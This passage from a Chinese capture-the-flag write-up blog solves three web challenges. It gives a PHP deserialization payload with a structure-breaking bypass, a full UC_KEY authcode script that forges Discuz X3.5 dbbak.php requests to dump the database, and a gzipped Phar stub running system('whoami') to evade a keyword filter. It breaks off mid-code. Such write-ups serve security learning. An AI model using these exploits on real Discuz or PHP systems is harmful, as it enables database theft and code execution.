class="hljs-variable">$suffix</span> = <span class="hljs-string">&#x27;/../flag&#x27;</span>;<br>    &#125;<br><br><span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br><span class="hljs-variable">$access</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Access</span>(); <br><span class="hljs-variable">$user</span>-&gt;value = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$access</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$user</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>但是这里还得进行绕过异常throw</p><p><a href="https://www.cnblogs.com/hithub/p/16634718.html">https://www.cnblogs.com/hithub/p/16634718.html</a></p><p>报错使用throw抛出异常导致__destruct不会执行，我们可以破坏反序列化结构从而绕过，由于类名是正确的就会调用类名的魔术方法__destruct,从而在throw前执行了__destruct</p><p>所以先将$user序列化，然后破坏掉结构再进行反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span> = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Access</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$prefix</span> = <span class="hljs-string">&#x27;/&#x27;</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$suffix</span> = <span class="hljs-string">&#x27;/../flag&#x27;</span>;<br>    &#125;<br><br><span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br><span class="hljs-variable">$user</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-variable">$access</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Access</span>(); <br><span class="hljs-variable">$user</span>-&gt;value = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$access</span>);<br><span class="hljs-variable">$aaa</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$user</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$aaa</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$bbb</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$aaa</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>);   <span class="hljs-comment">// 去掉最后 1 个字节（一般就是 `&#125;`）</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$bbb</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$bbb</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里要注意一下，因为是利用破坏结构的方式进行绕过，所以是残缺的字符串，会自动在前面加上s（也就是string）</p><p>所以我是将</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250817183446-en82my2.png" alt="image"></p><p>进行url解码，看哪里与编码前的不一样，进行了一个手动去除</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250817183705-ajnmnkw.png" alt="image"></p><h1 id="我曾有一份工作"><a href="#我曾有一份工作" class="headerlink" title="我曾有一份工作"></a>我曾有一份工作</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>一次备份，换来的是一张辞职信</p><p>flag 在 <code>pre_a_flag</code>​ 表里</p><p>本题允许使用扫描器</p><h2 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h2><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250820124350-hrnvrcm.png" alt="image"></p><p>是DISCUZ x3.5，先dirsearch扫描一下</p><p>扫描到了<a href="http://www.zip,里面是网站的备份文件/">www.zip,里面是网站的备份文件</a></p><p>题目描述里说flag在<code>pre_a_flag</code>​ 表里，也就是我们要拿到数据库</p><p>找到config文件夹，里面硬编码了数据库的一些信息</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;UC_CONNECT&#x27;</span>, <span class="hljs-string">&#x27;mysql&#x27;</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;UC_STANDALONE&#x27;</span>, <span class="hljs-number">0</span>);<br><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;UC_DBHOST&#x27;</span>, <span class="hljs-string">&#x27;localhost&#x27;</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;UC_DBUSER&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;UC_DBPW&#x27;</span>, <span class="hljs-string">&#x27;123456&#x27;</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;UC_DBNAME&#x27;</span>, <span class="hljs-string">&#x27;lilctf&#x27;</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;UC_DBCHARSET&#x27;</span>, <span class="hljs-string">&#x27;utf8mb4&#x27;</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;UC_DBTABLEPRE&#x27;</span>, <span class="hljs-string">&#x27;`lilctf`.pre_ucenter_&#x27;</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;UC_DBCONNECT&#x27;</span>, <span class="hljs-number">0</span>);<br><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;UC_AVTURL&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;UC_AVTPATH&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;UC_CHARSET&#x27;</span>, <span class="hljs-string">&#x27;utf-8&#x27;</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;UC_KEY&#x27;</span>, <span class="hljs-string">&#x27;N8ear1n0q4s646UeZeod130eLdlbqfs1BbRd447eq866gaUdmek7v2D9r9EeS6vb&#x27;</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;UC_API&#x27;</span>, <span class="hljs-string">&#x27;http://192.168.114.134/uc_server&#x27;</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;UC_APPID&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;UC_IP&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;UC_PPP&#x27;</span>, <span class="hljs-number">20</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>找到一篇<a href="https://mp.weixin.qq.com/s/IDkUpjPL0mzSxKOgldHPeQ">文章</a>为利用uc_key导出数据库</p><p>里面说到uc_key用&#x2F;api&#x2F;db&#x2F;dbbak.php操作数据库，先获取code，再访问&#x2F;api&#x2F;db&#x2F;dbbak.php?apptype&#x3D;discuzx&amp;code&#x3D;&amp;code</p><p>仿照文章中exp如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$uc_key</span>=<span class="hljs-string">&quot;N8ear1n0q4s646UeZeod130eLdlbqfs1BbRd447eq866gaUdmek7v2D9r9EeS6vb&quot;</span>;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;time=&#x27;</span>.<span class="hljs-title function_ invoke__">time</span>().<span class="hljs-string">&#x27;&amp;method=export&#x27;</span>;<br><span class="hljs-comment">//$a = &#x27;time=&#x27;.time().&#x27;&amp;method=export&amp;tableid=1$sqlpath=backup_2025&amp;backupfilename=1_a&#x27;;</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$code</span>=<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">_authcode</span>(<span class="hljs-variable">$a</span>, <span class="hljs-string">&#x27;ENCODE&#x27;</span>, <span class="hljs-variable">$uc_key</span>));<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_authcode</span>(<span class="hljs-params"><span class="hljs-variable">$string</span>, <span class="hljs-variable">$operation</span> = <span class="hljs-string">&#x27;DECODE&#x27;</span>, <span class="hljs-variable">$key</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$expiry</span> = <span class="hljs-number">0</span></span>) </span>&#123;    <br>    <span class="hljs-variable">$ckey_length</span> = <span class="hljs-number">4</span>;     <br>    <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$key</span> ? <span class="hljs-variable">$key</span> : UC_KEY);    <br>    <span class="hljs-variable">$keya</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$key</span>, <span class="hljs-number">0</span>, <span class="hljs-number">16</span>));   <br>    <span class="hljs-variable">$keyb</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$key</span>, <span class="hljs-number">16</span>, <span class="hljs-number">16</span>));    <br>    <span class="hljs-variable">$keyc</span> = <span class="hljs-variable">$ckey_length</span> ? (<span class="hljs-variable">$operation</span> == <span class="hljs-string">&#x27;DECODE&#x27;</span> ? <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$string</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$ckey_length</span>): <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">microtime</span>()), -<span class="hljs-variable">$ckey_length</span>)) : <span class="hljs-string">&#x27;&#x27;</span>;     <br>    <span class="hljs-variable">$cryptkey</span> = <span class="hljs-variable">$keya</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$keya</span>.<span class="hljs-variable">$keyc</span>);    <br>    <span class="hljs-variable">$key_length</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$cryptkey</span>);     <br>    <span class="hljs-variable">$string</span> = <span class="hljs-variable">$operation</span> == <span class="hljs-string">&#x27;DECODE&#x27;</span> ? <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$string</span>, <span class="hljs-variable">$ckey_length</span>)) : <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&#x27;%010d&#x27;</span>, <span class="hljs-variable">$expiry</span> ? <span class="hljs-variable">$expiry</span> + <span class="hljs-title function_ invoke__">time</span>() : <span class="hljs-number">0</span>).<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$string</span>.<span class="hljs-variable">$keyb</span>), <span class="hljs-number">0</span>, <span class="hljs-number">16</span>).<span class="hljs-variable">$string</span>;    <br>    <span class="hljs-variable">$string_length</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$string</span>);     <br>    <span class="hljs-variable">$result</span> = <span class="hljs-string">&#x27;&#x27;</span>;    <br>    <span class="hljs-variable">$box</span> = <span class="hljs-title function_ invoke__">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>);     <br>    <span class="hljs-variable">$rndkey</span> = <span class="hljs-keyword">array</span>();    <br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt;= <span class="hljs-number">255</span>; <span class="hljs-variable">$i</span>++) &#123;        <br>        <span class="hljs-variable">$rndkey</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$cryptkey</span>[<span class="hljs-variable">$i</span> % <span class="hljs-variable">$key_length</span>]);    <br>    &#125;     <br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span> = <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$i</span>++) &#123;     <br>        <span class="hljs-variable">$j</span> = (<span class="hljs-variable">$j</span> + <span class="hljs-variable">$box</span>[<span class="hljs-variable">$i</span>] + <span class="hljs-variable">$rndkey</span>[<span class="hljs-variable">$i</span>]) % <span class="hljs-number">256</span>; <br>        <span class="hljs-variable">$tmp</span> = <span class="hljs-variable">$box</span>[<span class="hljs-variable">$i</span>];      <br>        <span class="hljs-variable">$box</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$box</span>[<span class="hljs-variable">$j</span>];  <br>        <span class="hljs-variable">$box</span>[<span class="hljs-variable">$j</span>] = <span class="hljs-variable">$tmp</span>;    <br>    &#125;     <br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$a</span> = <span class="hljs-variable">$j</span> = <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$string_length</span>; <span class="hljs-variable">$i</span>++) &#123;     <br>        <span class="hljs-variable">$a</span> = (<span class="hljs-variable">$a</span> + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>;     <br>        <span class="hljs-variable">$j</span> = (<span class="hljs-variable">$j</span> + <span class="hljs-variable">$box</span>[<span class="hljs-variable">$a</span>]) % <span class="hljs-number">256</span>;   <br>        <span class="hljs-variable">$tmp</span> = <span class="hljs-variable">$box</span>[<span class="hljs-variable">$a</span>];    <br>        <span class="hljs-variable">$box</span>[<span class="hljs-variable">$a</span>] = <span class="hljs-variable">$box</span>[<span class="hljs-variable">$j</span>];    <br>        <span class="hljs-variable">$box</span>[<span class="hljs-variable">$j</span>] = <span class="hljs-variable">$tmp</span>;      <br>        <span class="hljs-variable">$result</span> .= <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$string</span>[<span class="hljs-variable">$i</span>]) ^ (<span class="hljs-variable">$box</span>[(<span class="hljs-variable">$box</span>[<span class="hljs-variable">$a</span>] + <span class="hljs-variable">$box</span>[<span class="hljs-variable">$j</span>]) % <span class="hljs-number">256</span>]));   <br>    &#125;   <br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$operation</span> == <span class="hljs-string">&#x27;DECODE&#x27;</span>) &#123;  <br>        <span class="hljs-keyword">if</span>((<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$result</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>) == <span class="hljs-number">0</span> || <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$result</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>) - <span class="hljs-title function_ invoke__">time</span>() &gt; <span class="hljs-number">0</span>) &amp;&amp; <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$result</span>, <span class="hljs-number">10</span>, <span class="hljs-number">16</span>) == <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$result</span>, <span class="hljs-number">26</span>).<span class="hljs-variable">$keyb</span>), <span class="hljs-number">0</span>, <span class="hljs-number">16</span>)) &#123;     <br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$result</span>, <span class="hljs-number">26</span>);      <br>        &#125; <span class="hljs-keyword">else</span> &#123;          <br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>;       <br>        &#125;    <br>    &#125; <span class="hljs-keyword">else</span> &#123; <br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$keyc</span>.<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$result</span>)); <br>    &#125; <br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250820135757-ftfkywv.png" alt="image"></p><p>得到sql文件，部分如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE TABLE</span> pre_a_flag (<br>  `id` <span class="hljs-type">smallint</span>(<span class="hljs-number">6</span>) unsigned <span class="hljs-keyword">NOT NULL</span>,<br>  flag <span class="hljs-type">varchar</span>(<span class="hljs-number">100</span>) <span class="hljs-keyword">NOT NULL</span>,<br>  <span class="hljs-keyword">UNIQUE</span> KEY cpgroupperm (`id`,flag)<br>) ENGINE<span class="hljs-operator">=</span>InnoDB <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8mb4 <span class="hljs-keyword">COLLATE</span><span class="hljs-operator">=</span>utf8mb4_unicode_ci;<br></code></pre></td></tr></table></figure><p>并且还已知这个是第一个表</p><p>接着就可以查看</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250820141918-pv5go6k.png" alt="image"></p><p>sql文件部分代码如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs sql"># Identify: MTc1NTY3MDY4MCxYMy41LGRpc2N1engsbXVsdGl2b2wsMQ<span class="hljs-operator">=</span><span class="hljs-operator">=</span><br># <span class="hljs-operator">&lt;</span>?php exit();?<span class="hljs-operator">&gt;</span><br># discuzx Multi<span class="hljs-operator">-</span>Volume Data Dump Vol<span class="hljs-number">.1</span><br># <span class="hljs-type">Time</span>: <span class="hljs-number">2025</span><span class="hljs-number">-08</span><span class="hljs-number">-20</span> <span class="hljs-number">06</span>:<span class="hljs-number">18</span>:<span class="hljs-number">00</span><br># Type: discuzx<br># <span class="hljs-keyword">Table</span> Prefix: pre_<br># utf8mb4<br># discuzx Home: https:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.discuz.vip<br># Please visit our website <span class="hljs-keyword">for</span> newest infomation about discuzx<br># <span class="hljs-comment">--------------------------------------------------------</span><br><br><br><span class="hljs-keyword">INSERT INTO</span> pre_a_flag <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-number">0x666c61677b746573745f666c61677d</span>);<br><span class="hljs-keyword">INSERT INTO</span> pre_a_flag <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-number">0x4c494c4354467b686176455f794f555f4630554e445f405f4a4f625f6e23773f5f6841684068617d</span>);<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250820142123-m9rpkbi.png" alt="image"></p><h1 id="php-jail-is-my-cry"><a href="#php-jail-is-my-cry" class="headerlink" title="php_jail_is_my_cry"></a>php_jail_is_my_cry</h1><h2 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h2><p>PHP Jail is my CRY</p><blockquote><p>请注意附件中的代码存在一行需要你补充的代码, 已经注释表明, 否则会存在问题</p><p>本题不出网, 最终需要执行 &#x2F;readflag</p></blockquote><p>hint：并没有开启 allow_url_include</p><p><a href="assets/101218_web-php_jail_is_my_cry-20250821101633-0c1y37s.zip">101218_web-php_jail_is_my_cry.zip</a></p><h2 id="题目解析-1"><a href="#题目解析-1" class="headerlink" title="题目解析"></a>题目解析</h2><p>通过dockerfile得知php版本为8.3.0</p><p>先查看index.php源代码，发现了上传文件的关键代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 上传文件</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$target_dir</span> = <span class="hljs-string">&quot;/tmp/&quot;</span>;<br>    <span class="hljs-variable">$target_file</span> = <span class="hljs-variable">$target_dir</span> . <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]);<br>    <span class="hljs-variable">$orig</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>];<br>    <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-string">&#x27;file://&#x27;</span>. <span class="hljs-variable">$orig</span>);<br>    <br>    <span class="hljs-comment">// I hide a trick to bypass open_basedir, I&#x27;m sure you can find it.</span><br><br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-literal">true</span>);<br>    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>    <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&#x27;&lt;?&#x27;</span>) === <span class="hljs-literal">false</span> &amp;&amp; <span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&#x27;php&#x27;</span>) === <span class="hljs-literal">false</span> &amp;&amp; <span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&#x27;halt&#x27;</span>) === <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$target_file</span>, <span class="hljs-variable">$data</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;存在 `&lt;?` 或者 `php` 或者 `halt` 恶意字符!&quot;</span>;<br>        <span class="hljs-variable">$data</span> = <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>由于 <code>basename()</code>​ 会剥离路径，仅保留纯文件名，上传内容中若含有 <code>&lt;?</code>​ &#x2F; <code>php</code>​ &#x2F; <code>halt</code>​ 会被拒绝，内容是直接用 <code>cURL</code>​ 读取的，不经过 web 解析，所以没法解码成木马指令来执行。</p><p>那么就只能用<a href="https://www.freebuf.com/articles/web/291992.html">Phar 反序列化</a></p><p><a href="https://fushuling.com/index.php/2025/07/30/%E5%BD%93include%E9%82%82%E9%80%85phar-deadsecctf2025-baby-web/">https://fushuling.com/index.php/2025/07/30/%e5%bd%93include%e9%82%82%e9%80%85phar-deadsecctf2025-baby-web/</a></p><p>省流：</p><ul><li><p>外表是 gzip 格式；</p></li><li><p>里面是 tar + Phar 元数据；</p></li><li><p>PHP 打开它的时候就需要：</p><ol><li>判断是 gzip；</li><li>解压到临时流；</li><li>再继续扫描 <code>__HALT_COMPILER();</code>​ 或 tar header；</li></ol></li></ul><p>要是我们打包成了gz，那么 PHP 会识别成gz，通过 <code>phar_parse_zipfile()</code>​ 去解析。</p><p>最后的结论就是，比如我们生成了一个phar文件，然后把他打包成gz文件，当我们include这个gz文件时，php会默认把这个gz文件解压回phar进行解析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;exploit.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><br><span class="hljs-variable">$stub</span> = <span class="hljs-string">&lt;&lt;&lt;&#x27;STUB&#x27;</span><br><span class="hljs-string">&lt;?php</span><br><span class="hljs-string">    system(&#x27;whoami&#x27;);</span><br><span class="hljs-string">    __HALT_COMPILER();</span><br><span class="hljs-string">?&gt;</span><br><span class="hljs-string">STUB</span>;<br><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-variable">$stub</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&#x27;test.txt&#x27;</span>, <span class="hljs-string">&#x27;test&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>注：php.ini文件中改为<code>phar.readonly = Off</code>​</p><p>这时还有明显的关键字</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250821140146-57cslw8.png" alt="image"></p><p>于是我们把它打包一下，关键字就会完全消失了，</p><p>当我们include这个.phar.gz文件时，php会自动解压这个gz文件，所以最后相当于是直接include这个phar文件，而这里有关键字：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br>    <span class="hljs-title function_ 